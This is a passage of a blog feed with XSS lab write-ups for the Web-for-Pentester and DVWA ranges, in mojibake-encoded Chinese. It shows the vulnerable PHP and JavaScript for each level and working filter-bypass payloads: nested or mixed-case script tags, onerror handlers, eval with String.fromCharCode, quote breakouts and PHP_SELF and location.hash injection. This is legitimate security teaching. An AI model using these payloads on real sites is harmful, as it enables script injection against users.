src=&quot;https://dn-coding-net-tweet.codehub.cn/photo/2019/9ec67d16-a8b9-41cd-82fa-14b0c0f96e72.gif&quot;&lt;/center&gt;&lt;?php echo &quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h3><p>getä¼ å…¥å¯ä»¥wordï¼Œè½¬æ¢ä¸ºå°å†™ï¼Œè®©è¿‡æ»¤scriptï¼Œç©ºæ ¼ï¼Œ/ï¼Œå¯ä»¥ä½¿ç”¨urlç¼–ç æ¥ç»•è¿‡<br>| ç¬¦å· |urlç¼–ç  |<br>| â€”â€”â€“ | â€”â€” |<br>| å›è½¦     | %0d |<br>| æ¢è¡Œ     | %0d |<br>payload:</p><pre><code>level15.php?keyword=&lt;img%0asrc=x%0aonerror=alert(&#39;XSS&#39;)&gt;</code></pre><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p>å›½å…‰å¤§ä½¬:<a href="https://www.sqlsec.com/2020/01/xss.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/01/xss.html</a><br>æœ€åæ¬¢è¿è®¿é—®æˆ‘çš„åšå®¢:<a href="https://lmg66.github.io/">https://lmg66.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web-for-Pentesteré¶åœº-xsséƒ¨åˆ†</title>
      <link href="/posts/fb02.html"/>
      <url>/posts/fb02.html</url>
      
        <content type="html"><![CDATA[<h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>å®˜ç½‘:<a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a><br>ä¸‹è½½åœ°å€:<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a><br>å®‰è£…æ–¹æ³•:è™šæ‹ŸæœºæŒ‰ç…§ï¼Œè¯¥é¶åœºæ˜¯å°è£…åœ¨debianç³»ç»Ÿé‡Œï¼Œå®‰è£…å®Œæˆæ‰“å¼€ï¼ŒifconfigæŸ¥çœ‹ipåœ°å€ï¼š<br><img src="https://Lmg66.github.io/img/75.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/76.png" alt="å›¾ç‰‡"><br>ç„¶åç›´æ¥è®¿é—®ipå³å¯<br>web for pentesteré»˜è®¤æ²¡æœ‰rootå¯†ç ï¼Œå¯ä»¥æ¥è®¾ç½®å¯†ç ï¼Œæ–¹ä¾¿sshè¿æ¥ç­‰æŸ¥çœ‹æºç </p><pre><code>sudo passwd</code></pre><h3 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h3><h4 id="æŸ¥çœ‹æºç "><a href="#æŸ¥çœ‹æºç " class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;?php        echo $_GET[&quot;name&quot;];?&gt;</code></pre><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œç›´æ¥å°†getè·å–çš„æ‰“å°</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>/xss/example1.php?name=<script>alert('xss')</script><br><img src="https://Lmg66.github.io/img/77.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h3><h4 id="æŸ¥çœ‹æºç -1"><a href="#æŸ¥çœ‹æºç -1" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>è¿™é‡Œé€šè¿‡preg_replace()å‡½æ•°æ¥æ­£åˆ™<script> </script>,ä½†æ˜¯è¿™ç§åŒ¹é…æ˜¯æœ‰ç¼ºé™·çš„ï¼Œæ²¡æœ‰åŒ¹é…å¤§å°å†™ï¼Œå¯ä»¥é€šè¿‡å¤§å°å†™ç»•è¿‡<br><img src="https://Lmg66.github.io/img/78.png" alt="å›¾ç‰‡"></p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example2.php?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;/Script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/79.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h3><h4 id="æŸ¥çœ‹æºç -2"><a href="#æŸ¥çœ‹æºç -2" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;?php        $name =  $_GET[&quot;name&quot;];        $name = preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;, $name);        $name = preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;, $name);echo $name;?&gt;</code></pre><h4 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>åœ¨ç¬¬äºŒå…³çš„åŸºç¡€ä¸ŠåŠ äº†/iï¼Œä½¿ä¹‹åŒ¹é…ä¸åŒºåˆ†å¤§å°å†™ï¼Œpreg_replace()å‡½æ•°å°†åŒ¹é…åˆ°çš„ï¼Œæ›¿æ¢æˆç©ºæ ¼ï¼Œä½†æ˜¯åªåŒ¹é…äº†ä¸€æ¬¡ï¼Œç±»ä¼¼sqlæ³¨å…¥(Seselectlect)ï¼Œå¯ä»¥åµŒå¥—&lt;sc<script>ript> </sc</script>ript&gt;ï¼ŒåŒ¹é…åˆ°äº†ï¼Œæ›¿æ¢æˆç©ºæ ¼å˜æˆæˆ‘ä»¬æƒ³è¦çš„äº†</p><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example3.php?name=&lt;sc&lt;script&gt;ript&gt;alert(&#39;xss&#39;)&lt;/sc&lt;/script&gt;ript&gt;</code></pre><p><img src="https://Lmg66.github.io/img/80.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h3><h4 id="æŸ¥çœ‹æºç -3"><a href="#æŸ¥çœ‹æºç -3" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/script/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>å¯¹scriptè¿›è¡Œäº†ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒ¹é…å¦‚æœåŒ¹é…åˆ°ï¼Œå°±æ‰§è¡Œdie(â€œerrorâ€),ç»ˆæ­¢ç¨‹åºï¼Œæ‰€ä»¥scirptä¸èƒ½ç”¨ï¼Œåªèƒ½é€šè¿‡å…¶ä»–æ ‡ç­¾æ¥è§¦å‘jsäº‹ä»¶ï¼Œå¯ä½¿ç”¨onerroräº‹ä»¶ï¼Œæ¥æ‰§è¡Œjs<br><img src="https://Lmg66.github.io/img/81.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/82.png" alt="å›¾ç‰‡"></p><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example4.php?name=&lt;img src=&quot;xss&quot; onerror=alert(&#39;xss&#39;)&gt;</code></pre><p><img src="https://Lmg66.github.io/img/83.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬äº”å…³"><a href="#ç¬¬äº”å…³" class="headerlink" title="ç¬¬äº”å…³"></a>ç¬¬äº”å…³</h3><h4 id="æŸ¥çœ‹æºç -4"><a href="#æŸ¥çœ‹æºç -4" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;?php require_once &#39;../header.php&#39;;if (preg_match(&#39;/alert/i&#39;, $_GET[&quot;name&quot;])) {  die(&quot;error&quot;);}?&gt;Hello &lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;</code></pre><h4 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>å¯¹alertè¿›è¡Œäº†è¿‡æ»¤</p><h5 id="ä¸€-å¯ä»¥ä½¿ç”¨ç±»ä¼¼alertçš„æ–¹æ³•æ¥å¼¹çª—æ¯”å¦‚confirmï¼Œprompt"><a href="#ä¸€-å¯ä»¥ä½¿ç”¨ç±»ä¼¼alertçš„æ–¹æ³•æ¥å¼¹çª—æ¯”å¦‚confirmï¼Œprompt" class="headerlink" title="ä¸€.å¯ä»¥ä½¿ç”¨ç±»ä¼¼alertçš„æ–¹æ³•æ¥å¼¹çª—æ¯”å¦‚confirmï¼Œprompt"></a>ä¸€.å¯ä»¥ä½¿ç”¨ç±»ä¼¼alertçš„æ–¹æ³•æ¥å¼¹çª—æ¯”å¦‚confirmï¼Œprompt</h5><p><img src="https://Lmg66.github.io/img/84.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/85.png" alt="å›¾ç‰‡"></p><h5 id="äºŒ-é€šè¿‡ç¼–ç ç»•è¿‡ï¼ŒString-fromCharCode-ç¼–ç æ¥ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨hackbaræ¥å¿«é€Ÿç¼–ç "><a href="#äºŒ-é€šè¿‡ç¼–ç ç»•è¿‡ï¼ŒString-fromCharCode-ç¼–ç æ¥ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨hackbaræ¥å¿«é€Ÿç¼–ç " class="headerlink" title="äºŒ.é€šè¿‡ç¼–ç ç»•è¿‡ï¼ŒString.fromCharCode()ç¼–ç æ¥ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨hackbaræ¥å¿«é€Ÿç¼–ç "></a>äºŒ.é€šè¿‡ç¼–ç ç»•è¿‡ï¼ŒString.fromCharCode()ç¼–ç æ¥ç»•è¿‡ï¼Œå¯ä»¥ä½¿ç”¨hackbaræ¥å¿«é€Ÿç¼–ç </h5><p><img src="https://Lmg66.github.io/img/86.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/87.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/88.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/89.png" alt="å›¾ç‰‡"></p><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example5.php?name=&lt;script&gt;confirm(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;prompt(&#39;xss&#39;)&lt;/script&gt;/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;</code></pre><p><img src="https://Lmg66.github.io/img/90.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/91.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/92.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬å…­å…³"><a href="#ç¬¬å…­å…³" class="headerlink" title="ç¬¬å…­å…³"></a>ç¬¬å…­å…³</h3><h4 id="æŸ¥çœ‹æºç -5"><a href="#æŸ¥çœ‹æºç -5" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;script&gt;        var $a= &quot;&lt;?php  echo $_GET[&quot;name&quot;]; ?&gt;&quot;;&lt;/script&gt;</code></pre><h4 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>é€šè¿‡getçš„æ–¹å¼ä¼ å…¥nameå˜é‡ï¼Œè¾“å…¥èµ‹å€¼ç»™å…¨å±€å˜é‡aï¼Œå¯ä»¥é€šè¿‡é—­åˆåŒå¼•å·æˆ–è€…æ³¨é‡ŠåŒå¼•å·æ¥å¢åŠ æˆ‘ä»¬çš„jsä»£ç </p><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);&quot;/xss/example6.php?name=&quot;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/93.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/94.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/95.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/96.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬ä¸ƒå…³"><a href="#ç¬¬ä¸ƒå…³" class="headerlink" title="ç¬¬ä¸ƒå…³"></a>ç¬¬ä¸ƒå…³</h3><h4 id="æŸ¥çœ‹æºç -6"><a href="#æŸ¥çœ‹æºç -6" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;script&gt;        var $a= &#39;&lt;?php  echo htmlentities($_GET[&quot;name&quot;]); ?&gt;&#39;;&lt;/script&gt;</code></pre><h4 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>å’Œç¬¬å…«å…³ç›¸ä¼¼htmlentities()ä¼šæŠŠå­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œä¼šå°†åŒå¼•å·è¿›è¡Œç¼–ç ï¼Œä½†ä¸ç¼–ç å•å¼•å·ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯å•å¼•å¥½æ‰€ä»¥å¯ä»¥ç»§ç»­åŒ…å«å’Œæ³¨é‡Š</p><h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);&#39;/xss/example7.php?name=&#39;;alert(&#39;xss&#39;);//</code></pre><p><img src="https://Lmg66.github.io/img/97.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/98.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/99.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/100.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬å…«å…³"><a href="#ç¬¬å…«å…³" class="headerlink" title="ç¬¬å…«å…³"></a>ç¬¬å…«å…³</h3><h4 id="æŸ¥çœ‹æºç -7"><a href="#æŸ¥çœ‹æºç -7" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;?php  require_once &#39;../header.php&#39;;if (isset($_POST[&quot;name&quot;])) {    echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;]);  }?&gt;&lt;form action=&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot; method=&quot;POST&quot;&gt;Your name:&lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot;/&gt;</code></pre><h4 id="åˆ†æ-7"><a href="#åˆ†æ-7" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>nameå˜é‡é€šè¿‡formè¡¨å•ä»¥postæ–¹å¼ä¼ å…¥ï¼Œç„¶åé€šè¿‡htmlentitieså‡½æ•°å®ä½“åŒ–åè¾“å‡ºæ¥ï¼Œå¹¶æœªæ‰¾åˆ°ç ´è§£çš„æ–¹æ³•ã€‚ç„¶åè§‚å¯Ÿ<form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">ï¼Œç”¨æˆ·å¯æ§åˆ¶å‚æ•°PHP_SELFï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆå¼•å·å’Œæ ‡ç­¾</p><h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example8.php/&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;///xss/example8.php/&quot; onclick=alert(&#39;XSS&#39;)//</code></pre><p><img src="https://Lmg66.github.io/img/101.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/102.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/103.png" alt="å›¾ç‰‡"></p><h3 id="ç¬¬ä¹å…³"><a href="#ç¬¬ä¹å…³" class="headerlink" title="ç¬¬ä¹å…³"></a>ç¬¬ä¹å…³</h3><h4 id="æŸ¥çœ‹æºç -8"><a href="#æŸ¥çœ‹æºç -8" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h4><pre><code>&lt;script&gt;  document.write(location.hash.substring(1));&lt;/script&gt;</code></pre><h4 id="åˆ†æ-8"><a href="#åˆ†æ-8" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h4><p>location.hashå±æ€§<br><img src="https://Lmg66.github.io/img/104.png" alt="å›¾ç‰‡"></p><h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload:"></a>payload:</h4><pre><code>/xss/example9.php#&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;</code></pre><p>æ³¨æ„ï¼šåœ¨ç«ç‹å’ŒChromeæµè§ˆå™¨&lt;&gt;ä¼šè¢«è‡ªåŠ¨è½¬ç </p><h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a href="https://www.sqlsec.com/2020/05/pentesterlab.html" target="_blank" rel="noopener">https://www.sqlsec.com/2020/05/pentesterlab.html</a><br><a href="https://blog.csdn.net/qq_20307987/article/details/51284169" target="_blank" rel="noopener">https://blog.csdn.net/qq_20307987/article/details/51284169</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWAé¶åœº-xsséƒ¨åˆ†æºç åˆ†æ</title>
      <link href="/posts/b063.html"/>
      <url>/posts/b063.html</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>DVWAé¶åœºéƒ½ä¸é™Œç”Ÿï¼Œæœ€æ–°å­¦ä¹ xssï¼Œä»æ–°åˆæäº†ä¸€éxsséƒ¨åˆ†ï¼Œä»æºç æ–¹é¢åº·åº·xssçš„åŸå› ï¼Œå‚è€ƒäº†å¾ˆå¤šå¤§ä½¬çš„åšå®¢è¡¨ç¤ºæ„Ÿè°¢</p><h3 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h3><p>å®˜ç½‘:<a href="">http://www.dvwa.co.uk/</a><br>ä¸‹è½½åœ°å€:<a href="">https://github.com/ethicalhack3r/DVWA</a><br>ä¸‹è½½æ–¹å¼:zipä¸‹è½½æˆ–git <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a><br>ä¸‹è½½å®Œæˆæ”¾å…¥httpæœåŠ¡ä¸‹å³å¯<br>æˆ‘ä½¿ç”¨çš„æ˜¯phpstudyä¸‹è½½åœ°å€:<a href="https://m.xp.cn/" target="_blank" rel="noopener">https://m.xp.cn/</a></p><h3 id="åå°„æ€§xss"><a href="#åå°„æ€§xss" class="headerlink" title="åå°„æ€§xss"></a>åå°„æ€§xss</h3><h4 id="çº§åˆ«low"><a href="#çº§åˆ«low" class="headerlink" title="çº§åˆ«low"></a>çº§åˆ«low</h4><h5 id="æŸ¥çœ‹æºç "><a href="#æŸ¥çœ‹æºç " class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Feedback for end user    $html .= &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;;}?&gt;</code></pre><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>nameå˜é‡æ²¡æœ‰è¿‡æ»¤ï¼Œç›´æ¥è¾“å‡º</p><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><code>/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&#39;xss&#39;)&lt;%2Fscript&gt;#</code></p><p><img src="https://Lmg66.github.io/img/105.png" alt="å›¾ç‰‡"></p><h4 id="çº§åˆ«-Medium"><a href="#çº§åˆ«-Medium" class="headerlink" title="çº§åˆ«:Medium"></a>çº§åˆ«:Medium</h4><h5 id="æŸ¥çœ‹æºç -1"><a href="#æŸ¥çœ‹æºç -1" class="headerlink" title="æŸ¥çœ‹æºç "></a>æŸ¥çœ‹æºç </h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><h5 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>è¿™é‡Œç”¨æ­£åˆ™è¡¨è¾¾è¿‡æ»¤&lt;scr/ipt&gt;æ ‡ç­¾,æ­£åˆ™çš„åŒ¹é…æœ‰ç¼ºé™·å¤§å°é—®é¢˜ï¼Œè€Œä¸”åªæ˜¯åŒ¹é…äº†ä¸€æ¬¡å¯ä»¥åµŒå¥—ï¼Œè€Œä¸”åªæ˜¯è¿‡æ»¤&lt;scr/ipt&gt;è¿˜å¯ä»¥ç”¨å…¶ä»–æ ‡ç­¾ä»£æ›¿æ¥è§¦å‘åå°„æ€§xss</p><h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><pre><code>vulnerabilities/xss_r/?name=&lt;Script&gt;alert(&#39;xss&#39;)&lt;%2FScript&gt;#vulnerabilities/xss_r/?name=&lt;img+src%3Dx+onerror%3Dalert(&#39;XSS&#39;)&gt;#/vulnerabilities/xss_r/?name=&lt;s&lt;script&gt;cript&gt;alert(&#39;XSS&#39;)&lt;%2Fscript&gt;#</code></pre><p><img src="https://Lmg66.github.io/img/106.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/107.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/108.png" alt="å›¾ç‰‡"></p><h4 id="çº§åˆ«-high"><a href="#çº§åˆ«-high" class="headerlink" title="çº§åˆ«:high"></a>çº§åˆ«:high</h4><h5 id="æŸ¥çœ‹æºç -2"><a href="#æŸ¥çœ‹æºç -2" class="headerlink" title="æŸ¥çœ‹æºç "></a>æŸ¥çœ‹æºç </h5><pre><code>&lt;?phpheader (&quot;X-XSS-Protection: 0&quot;);// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Get input    $name = preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}?&gt;</code></pre><h5 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>ä¸åŒºåˆ†å¤§å°å†™ï¼Œè€Œä¸”é€šé…ç¬¦åŒ¹é…ï¼ŒåµŒå¥—æ— æ³•ä½¿ç”¨ï¼Œå¯ä»¥å°è¯•å…¶ä»–æ ‡ç­¾è§¦å‘å¼¹çª—</p><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><p><code>/vulnerabilities/xss_r/?name=&lt;img+src%3D&quot;xss&quot;+onerror%3Dalert(&#39;xss&#39;)&gt;#</code></p><h4 id="çº§åˆ«-impossible"><a href="#çº§åˆ«-impossible" class="headerlink" title="çº§åˆ«:impossible"></a>çº§åˆ«:impossible</h4><h5 id="æŸ¥çœ‹æºç -3"><a href="#æŸ¥çœ‹æºç -3" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;?php// Is there any input?if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $name = htmlspecialchars( $_GET[ &#39;name&#39; ] );    // Feedback for end user    $html .= &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;}// Generate Anti-CSRF tokengenerateSessionToken();?&gt;</code></pre><h5 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>nameå˜é‡é€šè¿‡htmlspecialchars()å‡½æ•°æŠŠé¢„å®šçš„å­—ç¬¦è½¬ä¸ºHTMLå®ä½“ï¼Œä¸”è¾“å…¥åˆ°preæ ‡ç­¾é‡Œï¼Œæ‰€ä»¥å æ—¶<br><img src="https://Lmg66.github.io/img/109.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/110.png" alt="å›¾ç‰‡"></p><h3 id="DOMå‹xss"><a href="#DOMå‹xss" class="headerlink" title="DOMå‹xss"></a>DOMå‹xss</h3><h4 id="çº§åˆ«-low"><a href="#çº§åˆ«-low" class="headerlink" title="çº§åˆ«:low"></a>çº§åˆ«:low</h4><h5 id="æŸ¥çœ‹æºç -4"><a href="#æŸ¥çœ‹æºç -4" class="headerlink" title="æŸ¥çœ‹æºç :"></a>æŸ¥çœ‹æºç :</h5><pre><code>&lt;div class=&quot;vulnerable_code_area&quot;&gt;&lt;p&gt;Please choose a language:&lt;/p&gt;&lt;form name=&quot;XSS&quot; method=&quot;GET&quot;&gt;            &lt;select name=&quot;default&quot;&gt;                &lt;script&gt;                    if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) {                        var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);                        document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + $decodeURI(lang) + &quot;&lt;/option&gt;&quot;);                        document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);                    }                    document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;);                    document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;);                &lt;/script&gt;            &lt;/select&gt;            &lt;input type=&quot;submit&quot; value=&quot;Select&quot; /&gt;        &lt;/form&gt;&lt;/div&gt;</code></pre><h5 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h5><p>langå˜é‡é€šè¿‡document.location.hrefæ¥è·å–urlï¼Œå¹¶æ²¡æœ‰è¿‡æ»¤å°±è¾“å…¥åˆ°äº†optionæ ‡ç­¾ä¸­<br><img src="https://Lmg66.github.io/img/111.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/112.png" alt="å›¾ç‰‡"></p><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p><img src="https://Lmg66.github.io/img/113.png" alt="å›¾ç‰‡"></p><h4 id="çº§åˆ«-Medium-1"><a href="#çº§åˆ«-Medium-1" class="headerlink" title="çº§åˆ«:Medium"></a>çº§åˆ«:Medium</h4><h5 id="æŸ¥çœ‹æºç -5"><a href="#æŸ¥çœ‹æºç -5" 